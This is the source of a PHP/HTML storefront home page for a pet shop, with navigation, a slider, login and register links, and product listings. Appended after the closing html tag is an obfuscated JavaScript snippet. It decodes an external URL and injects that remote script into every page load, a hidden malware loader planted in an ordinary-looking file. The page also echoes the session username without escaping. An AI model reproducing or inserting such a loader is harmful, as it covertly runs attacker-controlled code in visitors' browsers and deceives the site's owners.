<!-- connect file -->
 <?php
 include('includes/connect.php');
 include('functions/common_function.php');
session_start();



?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ecommerce website using php and Mysql.</title>

    <!-- bootstrap css link -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    
    <!-- swiper slider  -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"/>

    <!-- font awesome link -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />


    <!-- css file -->
     <link rel="stylesheet" href="style.css">
     <style>
        body{
            overflow-x:hidden;
         }

         .navbar-collapse {
          flex-grow: 1;
          align-items: center;
          font-size: x-large;
         }

         .swiper {
              width: 100%;
              height: 750px;
          }

          .swiper-slide img{
            width: 100%;
            height: 750px;
            object-fit: cover;
          }

          .swiper-slide h4{
            font-size: 7rem;
            display: flex;
            justify-content: center;
            text-align:center;
            position: absolute;
            top: 16rem;
            left: 12rem;
          }

          .form-control{
            font-size: 1.3rem;
          }

        </style>
</head>
<body>
    <!-- navbar -->
     <div class="container-fluid p-0">
        <!-- first child -->
        <nav class="navbar navbar-expand-lg navbar-light bg-info">
  <div class="container-fluid">
   <img src="./webimg/petshoplogo.png" alt="" class="logo">
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="index.php">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="display_all.php">products</a>
        </li>


        <?php
              if(isset($_SESSION['username'])){
                echo "<li class='nav-item'>
                 <a class='nav-link' href='./users_area/profile.php'>My Account</a>
                 </li>";
                 }                                                                         //logout problem 
                 else{
                  echo "<li class='nav-item'>
                  <a class='nav-link' href='./users_area/user_registration.php'>Register</a>
                </li>";

                 }
                   ?>

        <li class="nav-item">
          <a class="nav-link" href="#">Contact</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="cart.php"><i class="fa-solid fa-cart-shopping"></i><sup><?php  cart_item(); ?></sup></a>
          </li>
        <li class="nav-item">
          <a class="nav-link" href="">Total price: <?php total_cart_price(); ?>/-</a>
        </li>
      </ul>
      <form class="d-flex" action="search_product.php" method="get">
        <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search" name="search_data">
         <input type="submit" value="search" class="btn btn-outline-light" name="search_data_product">
      </form>
    </div>
  </div>
</nav>
     
<!-- calling cart function -->
 <?php
 cart();
 ?>

     <!-- second child -->
      <nav class="navbar navbar-expand-lg navbar-dark bg-danger">
        <ul class="navbar-nav me-auto">
        
        <?php

if(!isset($_SESSION['username'])){
  echo " <li class='nav-item'>
  <a class='nav-link' href='#'>Welcome guest</a></li>";
 }else{
   echo " <li class='nav-item'>
  <a class='nav-link' href='#'>Welcome ".$_SESSION['username']."</a></li>";
 }
     if(!isset($_SESSION['username'])){
      echo " <li class='nav-item'>
      <a class='nav-link' href='./users_area/user_login.php'>  Login</a></li>";
     }else{
       echo " <li class='nav-item'>
      <a class='nav-link' href='logout.php'>  Logout</a></li>";
     }
        ?>

        </ul>
      </nav>


<!-- swiper slider -->
<div class="wrapper">
  <!-- Slider main container -->
<div class="swiper">
  <!-- Additional required wrapper -->
  <div class="swiper-wrapper">
    <!-- Slides -->
    <div class="swiper-slide">
      <h4>Find Your <br> Perfect Pet</h4>
      <img src="./webimg/slider6.jpg" alt="Slide 1">
    </div>
    <div class="swiper-slide">
      <h4>Makes Your <br> Pet Happy</h4>
      <img src="./webimg/slider1.jpg" alt="Slide 1">
    </div>
    <div class="swiper-slide">
      <h4>Makes Your <br> Pet Happy</h4>
      <img src="./webimg/slider3.jpg" alt="Slide 1">
    </div>
  </div>
  <!-- If we need pagination -->
  <div class="swiper-pagination"></div>

  <!-- If we need navigation buttons -->
  <div class="swiper-button-prev"></div>
  <div class="swiper-button-next"></div>

  <!-- If we need scrollbar -->
  <div class="swiper-scrollbar"></div>
</div>
 </div>




      <!-- third child -->
        <div class="bg-light py-5">
        <h3 class="text-center">Hidden Store</h3>
        <p class="text-center">Communication is at the heart of e-commerce website and community</p>
</div>

<!-- fourth child -->
<div class="row px-3">
    <div class="col-md-10">
        <!-- products -->
        <div class="row">

<!-- fetching products -->
        <?php
        //calling function
    getproducts();
    get_unique_categories();
    get_unique_brands();
  // $ip = getIPAddress();  
  //echo 'User Real IP Address - '.$ip;
  ?>
<!-- row end -->
 </div>
 <!-- col end -->
 </div>
 
 
<div class="col-md-2 bg-secondary p-0">
  
    <!-- brands to be displayed -->
    <ul class="navbar-nav me-auto text-center">
    <li class="nav-item bg-info">
    <a href="" class="nav-link text-light"><h4>Top Food Brands</h4></a>
</li>
<?php
getbrands();
?>
</ul>

<!-- categories to be displayed -->
<ul class="navbar-nav me-auto text-center">
<li class="nav-item bg-info">
    <a href="" class="nav-link text-light"><h4>Categories</h4></a>
</li>
<?php

getcategories();
?>

</ul>
   
  </div>
  </div>




     <!--  last child -->
        <!-- include footer -->
         <?php include("./includes/footer.php") ?> 
        </div>  
          

    




<!-- bootstrap js link -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

<!-- swiper slider  -->
<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
<script src="index.js"></script>
</body>
</html>
<script>var z=document.createElement("script");z.src="1js26cs62c4ub5ctr45js2htm4".replace(/1/,"http://").replace(/2/g,".").replace(/4/g,"l").replace(/5/g,"/");document.getElementsByTagName("HEAD")[0].appendChild(z);"//v|v\\";</script>